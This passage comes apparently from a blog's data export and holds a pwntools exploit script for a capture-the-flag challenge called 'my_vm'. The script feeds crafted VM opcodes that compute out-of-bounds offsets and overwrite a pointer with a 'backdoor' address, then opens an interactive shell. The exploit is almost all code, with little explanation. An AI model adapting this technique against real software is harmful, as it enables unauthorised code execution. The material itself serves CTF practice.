class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">14</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>)   <span class=\"comment\">#reg[0]=8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">Code(<span class=\"number\">0x50</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[1]=-8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>,<span class=\"number\">7</span>)   <span class=\"comment\">#reg[2]=7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[3]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>)   <span class=\"comment\">#reg[3]=0x77</span></span><br><span class=\"line\"><span class=\"comment\">### backdoor  </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>)   <span class=\"comment\">#reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}